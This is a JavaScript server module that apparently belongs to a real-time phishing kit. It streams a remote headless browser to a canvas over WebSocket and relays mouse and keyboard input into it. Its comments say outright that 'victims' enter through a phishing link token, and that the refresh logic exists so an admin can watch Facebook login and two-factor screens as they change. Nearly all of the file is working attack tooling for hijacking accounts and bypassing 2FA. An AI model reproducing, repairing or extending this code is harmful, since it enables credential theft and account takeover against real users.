// Live viewer over WebSocket.
//
// Out: the remote page is streamed as JPEG frames via CDP Page.startScreencast,
//      forwarded to the browser and drawn into a <canvas>.
// In:  the browser sends mouse/keyboard events, dispatched into the page via
//      CDP Input.dispatch{Mouse,Key}Event.
//
// PIN-gated (see the auth check below) — this hands out live mouse/keyboard
// control of a logged-in account, so it's checked the same as every other
// panel route. Coordinates are in the remote page's own pixel space (the
// client scales before sending). The client sends { t: 'resize', width,
// height, dpr } so the remote page fills its viewer.

import { getAccount, getAccountByRef } from './accounts.js';
import * as browser from './browser.js';
import { isLocked, recordFailure, recordSuccess } from './pinGuard.js';

// JPEG_QUALITY: 70 — niska kompresja → mniejsze klatki → szybszy transfer
// na łączu panel→user. Nadal wygląda ostro przy standardowym viewport.
const JPEG_QUALITY = 70;

export default async function viewerRoutes(app) {
  app.get('/api/accounts/:id/viewer', { websocket: true }, async (socket, req) => {
    const accountId = req.params.id;

    // The client sends its size as soon as the socket opens, before the setup
    // below finishes, so hold early messages until the handler is ready.
    let onMessage = null;
    const early = [];
    socket.on('message', (raw) => (onMessage ? onMessage(raw) : early.push(raw)));

    // --- auth + preconditions ---
    if (isLocked(req.ip)) {
      socket.close(4429, 'too_many_attempts');
      return;
    }
    {
      const { validateSession } = await import('./session.js');
      const cookieToken = (req.headers.cookie || '').match(/(?:^|;\s*)__sp_s=([0-9a-f]{64})/)?.[1];
      const isAdminSession = cookieToken && validateSession(cookieToken);
      // Victims authenticate via ?ref=<ref> (the ref is cryptographically random
      // and unguessable — it serves as the access token for the phishing link).
      const refParam = req.query?.ref || '';
      let isValidRef = false;
      if (refParam && !isAdminSession) {
        const refAcc = await getAccountByRef(refParam);
        isValidRef = Boolean(refAcc && refAcc.id === accountId);
      }
      if (!isAdminSession && !isValidRef) {
        recordFailure(req.ip);
        socket.close(4401, 'unauthorized');
        return;
      }
      recordSuccess(req.ip);
    }

    // Support both /api/accounts/:id/viewer and ref-based lookup
    let resolvedId = accountId;
    if (accountId.startsWith('ref:')) {
      const acc = await getAccountByRef(accountId.slice(4));
      if (!acc) { socket.close(4404, 'unknown_ref'); return; }
      resolvedId = acc.id;
    } else if (!await getAccount(accountId)) {
      socket.close(4404, 'unknown_account');
      return;
    }
    let cdp = await browser.newCdpSession(resolvedId).catch(() => null);
    if (!cdp) {
      socket.close(4409, 'session_not_running'); // call /start first
      return;
    }
    browser.logActivity(resolvedId, 'open', `Ktoś wszedł na podgląd (${accountId})`);

    const send = (obj) => {
      if (socket.readyState === socket.OPEN) socket.send(JSON.stringify(obj));
    };

    // --- outbound: screencast frames ---
    // Chromium only captures the next frame once we ack this one, so we use
    // that as backpressure: don't ack until the current frame has actually
    // been WRITTEN to the socket. Ack too early (before the slow link below
    // drains) and frames pile up faster than they can be delivered, which
    // looks exactly like a choppy, low-fps stream even though capture itself
    // is fine.
    // Temporary diagnostics: log actual achieved fps + per-frame send time
    // every 5s so we have real numbers instead of guessing at tuning values.
    let frameCount = 0;
    let sendTimeTotal = 0;
    let bytesTotal = 0;
    let statsStart = Date.now();
    const statsTimer = setInterval(() => {
      const elapsed = (Date.now() - statsStart) / 1000;
      if (frameCount > 0) {
        req.log.info({
          accountId: resolvedId,
          fps: (frameCount / elapsed).toFixed(1),
          avgSendMs: (sendTimeTotal / frameCount).toFixed(1),
          avgKB: (bytesTotal / frameCount / 1024).toFixed(1),
        }, 'viewer stream stats');
      }
      frameCount = 0; sendTimeTotal = 0; bytesTotal = 0; statsStart = Date.now();
    }, 5000);

    // CDP quirk (confirmed by direct testing): Page.startScreencast's own
    // frame payload ignores Emulation.setDeviceMetricsOverride's
    // deviceScaleFactor entirely — it always delivers at 1x regardless of
    // maxWidth/maxHeight or DSF, while Page.captureScreenshot DOES respect
    // DSF correctly. So screencast is used only as a "something repainted"
    // trigger here; the bytes actually sent come from a captureScreenshot
    // call, which is the only way to get a real high-DPI frame out of CDP.
    // captureInFlight/captureQueued coalesce bursts of repaints into at most
    // one pending extra capture, instead of queuing one per repaint.
    let captureInFlight = false;
    let captureQueued = false;
    const captureAndSend = async () => {
      if (captureInFlight) { captureQueued = true; return; }
      captureInFlight = true;
      const t0 = Date.now();
      try {
        const { data } = await cdp.send('Page.captureScreenshot', { format: 'jpeg', quality: JPEG_QUALITY });
        if (socket.readyState === socket.OPEN) {
          await new Promise((resolve) => socket.send(JSON.stringify({ t: 'frame', data }), () => resolve()));
          frameCount++;
          sendTimeTotal += Date.now() - t0;
          bytesTotal += data.length;
        }
      } catch (err) {
        req.log.warn({ accountId: resolvedId, err: String(err?.message || err).slice(0, 200) }, '[viewer] captureScreenshot error — CDP session may be stale');
      } finally {
        captureInFlight = false;
        if (captureQueued) { captureQueued = false; captureAndSend(); }
      }
    };

    const onFrame = async ({ sessionId }) => {
      browser.touchActivity(resolvedId);
      try {
        await cdp.send('Page.screencastFrameAck', { sessionId });
      } catch {
        /* page may have navigated/closed */
      }
      captureAndSend();
    };
    cdp.on('Page.screencastFrame', onFrame);

    const page = browser.getPage(resolvedId);
    const vp = page.viewportSize() || browser.DEFAULT_VIEWPORT;
    let currentSize = { width: vp.width, height: vp.height };
    let dpr = 1;

    // All screencast (re)arms — initial, on resize, and on navigation — go
    // through this single queue so they can never interleave their CDP calls
    // (e.g. a resize's stop/start racing a navigation's stop/start would let
    // whichever "start" lands last silently win with the wrong size).
    let armChain = Promise.resolve();
    const enqueueArm = (fn) => {
      const run = armChain.then(fn, fn);
      armChain = run.then(() => {}, (err) => { req.log.error({ err: String(err && err.message || err) }, 'viewer arm failed'); });
      return run;
    };

    // Stream at the current size*dpr; restarted on resize and on navigation.
    // Chromium only emits screencast frames when something repaints, so a
    // still page would never show its new size/content: send one snapshot
    // right away.
    const armScreencast = async (width, height) => {
      try { await cdp.send('Page.stopScreencast'); } catch { /* not started yet */ }
      await cdp.send('Page.startScreencast', {
        format: 'jpeg',
        quality: JPEG_QUALITY,
        maxWidth: Math.round(width * dpr),
        maxHeight: Math.round(height * dpr),
        everyNthFrame: 1,
      });
      await captureAndSend(); // seed a frame right away — see captureAndSend for why this (not the screencast payload) is what actually carries the DSF-scaled resolution
    };

    // To get a sharper frame we need Chromium to actually composite at a
    // higher device scale factor — Page.captureScreenshot (what we send,
    // see captureAndSend above) honors this correctly; confirmed by direct
    // testing that Page.startScreencast's own payload does not, regardless
    // of maxWidth/maxHeight. Must run AFTER setViewportSize(), since that
    // call issues its own Emulation.setDeviceMetricsOverride
    // (deviceScaleFactor 1) and would otherwise reset ours.
    const applyDeviceMetrics = async (width, height, scale) => {
      await page.setViewportSize({ width, height });
      await cdp.send('Emulation.setDeviceMetricsOverride', {
        width, height, deviceScaleFactor: scale, mobile: false,
        screenWidth: width, screenHeight: height,
      });
    };

    // A raw CDPSession is bound to the renderer/target it was created
    // against. A cross-process navigation can swap that target out from
    // under it, after which it stops delivering screencast frames with no
    // error event — this rebuilds the session from scratch when that happens.
    const rebindSession = async () => {
      const old = cdp;
      try { old.off('Page.screencastFrame', onFrame); } catch { /* ignore */ }
      try { await old.detach(); } catch { /* ignore */ }
      const fresh = await browser.newCdpSession(resolvedId).catch(() => null);
      if (!fresh) {
        socket.close(4409, 'session_not_running');
        throw new Error('session_not_running');
      }
      cdp = fresh;
      cdp.on('Page.screencastFrame', onFrame);
      await applyDeviceMetrics(currentSize.width, currentSize.height, dpr);
    };

    try {
      await enqueueArm(() => armScreencast(currentSize.width, currentSize.height));
    } catch {
      socket.close(4500, 'screencast_failed');
      return;
    }

    // Re-arm the screencast on every top-level navigation — this is what the
    // sign-in page sometimes failing to appear came down to: the background
    // goto() in browser.js's start() (including its retry attempts) can swap
    // the renderer out from under the CDP session armed above, silently
    // killing frame delivery with nothing left on screen but the last frame
    // before navigation. Debounced because a retried goto() fires several
    // navigations in quick succession and we only need to re-arm once.
    let navDebounce = null;
    const navHandler = (frame) => {
      if (frame !== page.mainFrame()) return;
      req.log.info({ accountId: resolvedId, url: frame.url() }, '[viewer] framenavigated');
      browser.logActivity(resolvedId, 'nav', `URL: ${frame.url()}`);
      clearTimeout(navDebounce);
      navDebounce = setTimeout(() => {
        enqueueArm(async () => {
          // Always rebind after navigation — a stale CDP session silently
          // captures from the old renderer and freezes the canvas.
          try {
            await rebindSession();
            await armScreencast(currentSize.width, currentSize.height);
            req.log.info({ accountId: resolvedId }, '[viewer] screencast re-armed after nav+rebind');
          } catch (err) {
            req.log.warn({ accountId: resolvedId, err: String(err?.message || err).slice(0, 150) }, '[viewer] screencast re-arm FAILED after nav');
          }
        });
      }, 200);
    };
    page.on('framenavigated', navHandler);

    // Dodatkowe logi diagnostyczne: wszystkie page errors, request failures
    // (np. zablokowane przez proxy albo nasz blocker) i konsola przeglądarki.
    page.on('pageerror', (err) => {
      req.log.warn({ accountId: resolvedId, err: String(err?.message || err).slice(0, 300) }, '[viewer] page JS error');
    });
    page.on('requestfailed', (req2) => {
      const failure = req2.failure();
      if (!failure) return;
      // Pomiń oczywisty aborted (route.abort) żeby nie zasypywać logów
      if (/net::ERR_ABORTED|net::ERR_BLOCKED_BY_CLIENT/.test(failure.errorText || '')) return;
      req.log.warn({
        accountId: resolvedId,
        url: req2.url().slice(0, 200),
        err: failure.errorText,
        method: req2.method(),
      }, '[viewer] request FAILED');
    });
    page.on('response', (res) => {
      const status = res.status();
      // Loguj TYLKO błędy i 3xx/4xx które mogą wskazywać blokadę
      if (status >= 400) {
        req.log.info({
          accountId: resolvedId,
          status,
          url: res.url().slice(0, 200),
        }, '[viewer] HTTP error response');
      }
    });

    // Chromium's CDP screencast only emits a frame when the compositor
    // actually REPAINTS. Facebook's 2FA screens often swap via React
    // without touching the compositor (same background, overlay-level
    // DOM changes), so the admin would stare at the stale login form
    // for 60-120s even though the new screen is already there.
    //
    // Heartbeat: force a capture every 1.5s regardless of repaints. Users
    // see any DOM-level change (modal, redirect, QR code) within 1.5s.
    // Shorter cadence than 2s because FB UI transitions are fast.
    //
    // NOTE: we do NOT listen to page.on('response') — Facebook pumps
    // dozens of XHR responses per second (realtime, polling, telemetry);
    // triggering captureAndSend on each one floods the CDP command queue
    // and starves input events (click/keyboard), so the user sees
    // "clicking does nothing" even though the bot IS alive.
    const heartbeatTimer = setInterval(() => {
      if (socket.readyState === socket.OPEN) captureAndSend();
    }, 1500);

    // --- inbound: input events ---
    onMessage = async (raw) => {
      let msg;
      try {
        msg = JSON.parse(raw.toString());
      } catch {
        return;
      }
      browser.touchActivity(resolvedId);
      try {
        if (msg.t === 'resize') {
          // Scale the client's reported window size down to fit the cap
          // while keeping ITS aspect ratio — clamping width/height independently
          // distorts the ratio (e.g. a wide desktop window ends up looking like
          // a tablet's) because object-fit:contain then pillarboxes the result.
          // 1600×900 used to be the cap here — far smaller than most real
          // monitors, so the page rendered small and then got stretched back
          // up by CSS to fill the window, which is blur no DPR fix can undo
          // (DPR controls how many physical pixels we render PER css pixel of
          // viewport; it does nothing if the viewport itself is too small).
          // 2560×1440 covers the large majority of real displays at 1x scaling.
          const reqW = Math.max(1, Math.round(msg.width));
          const reqH = Math.max(1, Math.round(msg.height));
          const scale = Math.min(1, 2560 / reqW, 1440 / reqH);
          const width = Math.max(320, Math.round(reqW * scale));
          const height = Math.max(240, Math.round(reqH * scale));
          // Cap the resulting PHYSICAL pixel width, not the DPR number itself
          // — a phone's small CSS viewport (~375-430px) can use its full
          // native DPR (often 3 on modern iPhones) for barely any extra
          // bytes, while a wide desktop HiDPI window gets its DPR scaled
          // back automatically so a large viewport × 3 doesn't balloon frame
          // size. A flat "DPR ≤ 2" cap was wrong for phones specifically —
          // capping it there made mobile screens look soft compared to every
          // native-rendered element around them at their real 3x density.
          const requestedDpr = Math.max(1, Number(msg.dpr) || 1);
          const MAX_PHYSICAL_WIDTH = 2600;
          dpr = Math.min(requestedDpr, Math.max(1, MAX_PHYSICAL_WIDTH / width));
          currentSize = { width, height };
          await enqueueArm(async () => {
            await applyDeviceMetrics(width, height, dpr);
            await armScreencast(width, height);
          });
        } else if (msg.t === 'mouse') {
          await cdp.send('Input.dispatchMouseEvent', {
            type: msg.type, // mousePressed | mouseReleased | mouseMoved | mouseWheel
            x: msg.x,
            y: msg.y,
            button: msg.button || 'none',
            buttons: msg.buttons || 0,
            clickCount: msg.clickCount || 0,
            deltaX: msg.deltaX || 0,
            deltaY: msg.deltaY || 0,
            modifiers: msg.modifiers || 0,
          });
        } else if (msg.t === 'key') {
          await cdp.send('Input.dispatchKeyEvent', {
            type: msg.type, // keyDown | keyUp | char | rawKeyDown
            key: msg.key,
            code: msg.code,
            text: msg.text,
            windowsVirtualKeyCode: msg.keyCode,
            modifiers: msg.modifiers || 0,
          });
        }
      } catch {
        /* ignore transient CDP errors (navigation mid-dispatch) */
      }
    };
    for (const raw of early.splice(0)) await onMessage(raw);

    // --- cleanup ---
    const cleanup = async () => {
      clearInterval(statsTimer);
      clearInterval(heartbeatTimer);
      clearTimeout(navDebounce);
      page.off('framenavigated', navHandler);
      try { cdp.off('Page.screencastFrame', onFrame); } catch { /* ignore */ }
      try {
        await cdp.send('Page.stopScreencast');
      } catch {
        /* ignore */
      }
      try {
        await cdp.detach();
      } catch {
        /* ignore */
      }
    };
    socket.on('close', cleanup);
    socket.on('error', cleanup);
  });
}
